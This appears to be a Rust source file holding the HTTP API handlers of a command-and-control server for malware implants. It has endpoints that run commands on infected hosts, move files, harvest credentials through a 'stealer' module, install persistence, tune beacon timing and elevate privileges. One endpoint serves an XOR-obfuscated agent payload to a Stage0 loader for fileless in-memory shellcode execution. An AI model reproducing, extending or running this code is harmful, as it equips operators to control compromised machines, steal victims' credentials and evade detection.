//! API Handlers
//!
//! HTTP request handlers for the team client API.

use axum::{
    extract::{Path, State},
    http::{HeaderMap, StatusCode},
    Json,
};
use std::sync::Arc;

use super::models::*;
use super::state::ApiState;

/// Extract and validate auth token from headers
fn extract_token(headers: &HeaderMap) -> Option<String> {
    headers
        .get("Authorization")
        .and_then(|v| v.to_str().ok())
        .and_then(|v| v.strip_prefix("Bearer "))
        .map(|s| s.to_string())
}

/// List all connected agents
pub async fn list_agents(
    State(state): State<Arc<ApiState>>,
    headers: HeaderMap,
) -> Result<Json<ApiResponse<AgentListResponse>>, StatusCode> {
    // Validate token
    if let Some(token) = extract_token(&headers) {
        if !state.validate_token(&token).await {
            return Err(StatusCode::UNAUTHORIZED);
        }
    } else {
        return Err(StatusCode::UNAUTHORIZED);
    }

    let agents = state.get_agents().await;
    let total = agents.len();

    Ok(Json(ApiResponse::success(AgentListResponse {
        agents,
        total,
    })))
}

/// Get a specific agent by ID
pub async fn get_agent(
    State(state): State<Arc<ApiState>>,
    headers: HeaderMap,
    Path(id): Path<u64>,
) -> Result<Json<ApiResponse<AgentInfo>>, StatusCode> {
    // Validate token
    if let Some(token) = extract_token(&headers) {
        if !state.validate_token(&token).await {
            return Err(StatusCode::UNAUTHORIZED);
        }
    } else {
        return Err(StatusCode::UNAUTHORIZED);
    }

    match state.get_agent(id).await {
        Some(agent) => Ok(Json(ApiResponse::success(agent))),
        None => Err(StatusCode::NOT_FOUND),
    }
}

/// Send a command to a specific agent
pub async fn send_command(
    State(state): State<Arc<ApiState>>,
    headers: HeaderMap,
    Path(id): Path<u64>,
    Json(request): Json<CommandRequest>,
) -> Result<Json<CommandResponse>, StatusCode> {
    // Validate token
    if let Some(token) = extract_token(&headers) {
        if !state.validate_token(&token).await {
            return Err(StatusCode::UNAUTHORIZED);
        }
    } else {
        return Err(StatusCode::UNAUTHORIZED);
    }

    match state.send_command(id, request.command.clone()).await {
        Ok(_) => Ok(Json(CommandResponse {
            success: true,
            message: format!("Command sent to agent {}", id),
            agent_id: id,
        })),
        Err(e) => Ok(Json(CommandResponse {
            success: false,
            message: e,
            agent_id: id,
        })),
    }
}

/// Send a command to all agents
pub async fn send_command_all(
    State(state): State<Arc<ApiState>>,
    headers: HeaderMap,
    Json(request): Json<CommandRequest>,
) -> Result<Json<ApiResponse<Vec<CommandResponse>>>, StatusCode> {
    // Validate token
    if let Some(token) = extract_token(&headers) {
        if !state.validate_token(&token).await {
            return Err(StatusCode::UNAUTHORIZED);
        }
    } else {
        return Err(StatusCode::UNAUTHORIZED);
    }

    let results = state.send_command_all(request.command.clone()).await;
    let responses: Vec<CommandResponse> = results
        .into_iter()
        .map(|(id, result)| match result {
            Ok(_) => CommandResponse {
                success: true,
                message: format!("Command sent to agent {}", id),
                agent_id: id,
            },
            Err(e) => CommandResponse {
                success: false,
                message: e,
                agent_id: id,
            },
        })
        .collect();

    Ok(Json(ApiResponse::success(responses)))
}

/// Download a file from an agent
pub async fn download_file(
    State(state): State<Arc<ApiState>>,
    headers: HeaderMap,
    Path(id): Path<u64>,
    Json(request): Json<DownloadRequest>,
) -> Result<Json<CommandResponse>, StatusCode> {
    // Validate token
    if let Some(token) = extract_token(&headers) {
        if !state.validate_token(&token).await {
            return Err(StatusCode::UNAUTHORIZED);
        }
    } else {
        return Err(StatusCode::UNAUTHORIZED);
    }

    let command = format!("__DOWNLOAD__:{}", request.remote_path);
    match state.send_command(id, command).await {
        Ok(_) => Ok(Json(CommandResponse {
            success: true,
            message: format!("Download request sent for: {}", request.remote_path),
            agent_id: id,
        })),
        Err(e) => Ok(Json(CommandResponse {
            success: false,
            message: e,
            agent_id: id,
        })),
    }
}

/// Upload a file to an agent
pub async fn upload_file(
    State(state): State<Arc<ApiState>>,
    headers: HeaderMap,
    Path(id): Path<u64>,
    Json(request): Json<UploadRequest>,
) -> Result<Json<CommandResponse>, StatusCode> {
    // Validate token
    if let Some(token) = extract_token(&headers) {
        if !state.validate_token(&token).await {
            return Err(StatusCode::UNAUTHORIZED);
        }
    } else {
        return Err(StatusCode::UNAUTHORIZED);
    }

    let command = format!(
        "__UPLOAD__|{}|{}",
        request.remote_path, request.local_data_base64
    );
    match state.send_command(id, command).await {
        Ok(_) => Ok(Json(CommandResponse {
            success: true,
            message: format!("Upload sent to: {}", request.remote_path),
            agent_id: id,
        })),
        Err(e) => Ok(Json(CommandResponse {
            success: false,
            message: e,
            agent_id: id,
        })),
    }
}

/// List directory contents from an agent
pub async fn list_directory(
    State(state): State<Arc<ApiState>>,
    headers: HeaderMap,
    Path(id): Path<u64>,
    Json(request): Json<ListDirRequest>,
) -> Result<Json<CommandResponse>, StatusCode> {
    // Validate token
    if let Some(token) = extract_token(&headers) {
        if !state.validate_token(&token).await {
            return Err(StatusCode::UNAUTHORIZED);
        }
    } else {
        return Err(StatusCode::UNAUTHORIZED);
    }

    // If path is empty, agent will list current directory
    let command = if request.path.is_empty() {
        "__LISTDIR__".to_string()
    } else {
        format!("__LISTDIR__:{}", request.path)
    };
    match state.send_command(id, command).await {
        Ok(_) => Ok(Json(CommandResponse {
            success: true,
            message: format!(
                "List directory request sent for: {}",
                if request.path.is_empty() {
                    "current directory"
                } else {
                    &request.path
                }
            ),
            agent_id: id,
        })),
        Err(e) => Ok(Json(CommandResponse {
            success: false,
            message: e,
            agent_id: id,
        })),
    }
}

/// Change current directory on an agent
pub async fn change_directory(
    State(state): State<Arc<ApiState>>,
    headers: HeaderMap,
    Path(id): Path<u64>,
    Json(request): Json<CdRequest>,
) -> Result<Json<CommandResponse>, StatusCode> {
    // Validate token
    if let Some(token) = extract_token(&headers) {
        if !state.validate_token(&token).await {
            return Err(StatusCode::UNAUTHORIZED);
        }
    } else {
        return Err(StatusCode::UNAUTHORIZED);
    }

    let command = format!("__CD__:{}", request.path);
    match state.send_command(id, command).await {
        Ok(_) => Ok(Json(CommandResponse {
            success: true,
            message: format!("Change directory request sent for: {}", request.path),
            agent_id: id,
        })),
        Err(e) => Ok(Json(CommandResponse {
            success: false,
            message: e,
            agent_id: id,
        })),
    }
}

/// Get current working directory of an agent
pub async fn get_cwd(
    State(state): State<Arc<ApiState>>,
    headers: HeaderMap,
    Path(id): Path<u64>,
) -> Result<Json<CommandResponse>, StatusCode> {
    // Validate token
    if let Some(token) = extract_token(&headers) {
        if !state.validate_token(&token).await {
            return Err(StatusCode::UNAUTHORIZED);
        }
    } else {
        return Err(StatusCode::UNAUTHORIZED);
    }

    match state.send_command(id, "__PWD__".to_string()).await {
        Ok(_) => Ok(Json(CommandResponse {
            success: true,
            message: "Get current directory request sent".to_string(),
            agent_id: id,
        })),
        Err(e) => Ok(Json(CommandResponse {
            success: false,
            message: e,
            agent_id: id,
        })),
    }
}

/// Harvest credentials from an agent
pub async fn harvest_credentials(
    State(state): State<Arc<ApiState>>,
    headers: HeaderMap,
    Path(id): Path<u64>,
) -> Result<Json<CommandResponse>, StatusCode> {
    // Validate token
    if let Some(token) = extract_token(&headers) {
        if !state.validate_token(&token).await {
            return Err(StatusCode::UNAUTHORIZED);
        }
    } else {
        return Err(StatusCode::UNAUTHORIZED);
    }

    // TODO: Full implementation should coordinate with the main server's module system
    // to upload stealer.enc and stealer.key before sending the harvest command.
    // Currently sends __HARVEST__ directly which requires modules to be pre-deployed.
    match state.send_command(id, "__HARVEST__".to_string()).await {
        Ok(_) => Ok(Json(CommandResponse {
            success: true,
            message: "Harvest command sent".to_string(),
            agent_id: id,
        })),
        Err(e) => Ok(Json(CommandResponse {
            success: false,
            message: e,
            agent_id: id,
        })),
    }
}

/// Set persistence on an agent
pub async fn set_persistence(
    State(state): State<Arc<ApiState>>,
    headers: HeaderMap,
    Path(id): Path<u64>,
    Json(request): Json<PersistenceRequest>,
) -> Result<Json<CommandResponse>, StatusCode> {
    // Validate token
    if let Some(token) = extract_token(&headers) {
        if !state.validate_token(&token).await {
            return Err(StatusCode::UNAUTHORIZED);
        }
    } else {
        return Err(StatusCode::UNAUTHORIZED);
    }

    let command = format!("__PERSIST__:{}", request.method);
    match state.send_command(id, command).await {
        Ok(_) => Ok(Json(CommandResponse {
            success: true,
            message: format!("Persistence {} sent", request.method),
            agent_id: id,
        })),
        Err(e) => Ok(Json(CommandResponse {
            success: false,
            message: e,
            agent_id: id,
        })),
    }
}

/// Remove persistence from an agent
pub async fn remove_persistence(
    State(state): State<Arc<ApiState>>,
    headers: HeaderMap,
    Path(id): Path<u64>,
) -> Result<Json<CommandResponse>, StatusCode> {
    // Validate token
    if let Some(token) = extract_token(&headers) {
        if !state.validate_token(&token).await {
            return Err(StatusCode::UNAUTHORIZED);
        }
    } else {
        return Err(StatusCode::UNAUTHORIZED);
    }

    match state
        .send_command(id, "__PERSIST_REMOVE__".to_string())
        .await
    {
        Ok(_) => Ok(Json(CommandResponse {
            success: true,
            message: "Remove persistence command sent".to_string(),
            agent_id: id,
        })),
        Err(e) => Ok(Json(CommandResponse {
            success: false,
            message: e,
            agent_id: id,
        })),
    }
}

/// Configure beacon timing
pub async fn configure_beacon(
    State(state): State<Arc<ApiState>>,
    headers: HeaderMap,
    Path(id): Path<u64>,
    Json(request): Json<BeaconRequest>,
) -> Result<Json<CommandResponse>, StatusCode> {
    // Validate token
    if let Some(token) = extract_token(&headers) {
        if !state.validate_token(&token).await {
            return Err(StatusCode::UNAUTHORIZED);
        }
    } else {
        return Err(StatusCode::UNAUTHORIZED);
    }

    let command = format!("__BEACON__:{}:{}", request.interval, request.jitter);
    match state.send_command(id, command).await {
        Ok(_) => Ok(Json(CommandResponse {
            success: true,
            message: format!("Beacon config {}:{} sent", request.interval, request.jitter),
            agent_id: id,
        })),
        Err(e) => Ok(Json(CommandResponse {
            success: false,
            message: e,
            agent_id: id,
        })),
    }
}

/// Elevate agent to admin
pub async fn elevate_agent(
    State(state): State<Arc<ApiState>>,
    headers: HeaderMap,
    Path(id): Path<u64>,
) -> Result<Json<CommandResponse>, StatusCode> {
    // Validate token
    if let Some(token) = extract_token(&headers) {
        if !state.validate_token(&token).await {
            return Err(StatusCode::UNAUTHORIZED);
        }
    } else {
        return Err(StatusCode::UNAUTHORIZED);
    }

    match state.send_command(id, "__ELEVATE__".to_string()).await {
        Ok(_) => Ok(Json(CommandResponse {
            success: true,
            message: "Elevate command sent".to_string(),
            agent_id: id,
        })),
        Err(e) => Ok(Json(CommandResponse {
            success: false,
            message: e,
            agent_id: id,
        })),
    }
}

/// Login and get auth token
pub async fn login(
    State(state): State<Arc<ApiState>>,
    Json(request): Json<LoginRequest>,
) -> Json<LoginResponse> {
    // Use constant-time comparison to prevent timing attacks
    let password_match =
        constant_time_compare(request.password.as_bytes(), state.api_password.as_bytes());

    if password_match {
        let token = state.create_token(request.username.clone()).await;
        Json(LoginResponse {
            success: true,
            token: Some(token),
            message: format!("Welcome, {}", request.username),
        })
    } else {
        Json(LoginResponse {
            success: false,
            token: None,
            message: "Invalid credentials".to_string(),
        })
    }
}

/// Constant-time comparison to prevent timing attacks
fn constant_time_compare(a: &[u8], b: &[u8]) -> bool {
    if a.len() != b.len() {
        return false;
    }

    let mut result = 0u8;
    for (x, y) in a.iter().zip(b.iter()) {
        result |= x ^ y;
    }
    result == 0
}

/// Logout and invalidate token
pub async fn logout(
    State(state): State<Arc<ApiState>>,
    headers: HeaderMap,
) -> Json<ApiResponse<()>> {
    if let Some(token) = extract_token(&headers) {
        state.remove_token(&token).await;
        Json(ApiResponse {
            success: true,
            data: None,
            error: None,
        })
    } else {
        Json(ApiResponse {
            success: false,
            data: None,
            error: Some("No token provided".to_string()),
        })
    }
}

/// Get server status
pub async fn server_status(State(state): State<Arc<ApiState>>) -> Json<ServerStatus> {
    let agents = state.get_agents().await;
    Json(ServerStatus {
        status: "running".to_string(),
        version: env!("CARGO_PKG_VERSION").to_string(),
        uptime_seconds: state.start_time.elapsed().as_secs(),
        connected_agents: agents.len(),
        tls_enabled: true,
    })
}

/// XOR encryption key for agent download (same as in builder)
const AGENT_XOR_KEY: &[u8] = b"C2R2_STAGE0_AGENT_KEY_2026";

/// Download the full agent (XOR encrypted) for Stage0
/// 
/// Stage0 calls this endpoint to download the agent binary.
/// The agent is XOR encrypted for basic obfuscation in transit.
/// 
/// Response format:
/// - First 4 bytes: XOR key length (little-endian u32)
/// - Next N bytes: XOR key
/// - Next 4 bytes: agent size (little-endian u32)
/// - Remaining: XOR encrypted agent bytes (shellcode format for in-memory execution)
pub async fn download_stage0_agent() -> impl axum::response::IntoResponse {
    use axum::http::{header, StatusCode};
    use std::fs;
    
    // Stage0 downloads agent and executes as shellcode in memory
    // Agent DLL is converted to sRDI shellcode for 100% fileless execution
    // Prioritize .bin (sRDI shellcode) over .exe
    let agent_paths = [
        // sRDI shellcode (preferred - 100% fileless)
        "agent.bin",
        "dist/agent.bin",
        "agent/agent.bin",
        "modules/agent.bin",
        "../agent.bin",
        "../dist/agent.bin",
        // EXE fallback (uses temp file)
        "agent.exe",
        "dist/agent.exe",
    ];
    
    let agent_path = agent_paths.iter().find(|p| std::path::Path::new(p).exists());
    
    // Log which paths were checked for debugging
    if agent_path.is_none() {
        tracing::warn!("Agent not found. Searched paths:");
        for path in agent_paths.iter() {
            tracing::warn!("  - {} (exists: {})", path, std::path::Path::new(path).exists());
        }
        // Also log current working directory
        if let Ok(cwd) = std::env::current_dir() {
            tracing::warn!("  Current directory: {:?}", cwd);
        }
    }
    
    let agent_bytes = match agent_path {
        Some(path) => {
            tracing::info!("Found agent at: {}", path);
            match fs::read(path) {
                Ok(bytes) => bytes,
                Err(e) => {
                    tracing::error!("Error reading agent from {}: {}", path, e);
                    return (
                        StatusCode::INTERNAL_SERVER_ERROR,
                        [(header::CONTENT_TYPE, "application/octet-stream")],
                        format!("ERROR:Failed to read agent: {}", e).into_bytes(),
                    );
                }
            }
        }
        None => {
            tracing::error!("Agent not found in any expected path");
            return (
                StatusCode::NOT_FOUND,
                [(header::CONTENT_TYPE, "application/octet-stream")],
                b"ERROR:Agent not found".to_vec(),
            );
        }
    };
    
    tracing::info!("Serving agent ({} bytes, XOR encrypted)", agent_bytes.len());
    
    // XOR encrypt the agent
    let encrypted: Vec<u8> = agent_bytes
        .iter()
        .enumerate()
        .map(|(i, &byte)| byte ^ AGENT_XOR_KEY[i % AGENT_XOR_KEY.len()])
        .collect();
    
    // Build response: key_len(4) + key + size(4) + encrypted_agent
    let mut response = Vec::with_capacity(4 + AGENT_XOR_KEY.len() + 4 + encrypted.len());
    response.extend_from_slice(&(AGENT_XOR_KEY.len() as u32).to_le_bytes());
    response.extend_from_slice(AGENT_XOR_KEY);
    response.extend_from_slice(&(encrypted.len() as u32).to_le_bytes());
    response.extend_from_slice(&encrypted);
    
    (
        StatusCode::OK,
        [(header::CONTENT_TYPE, "application/octet-stream")],
        response,
    )
}
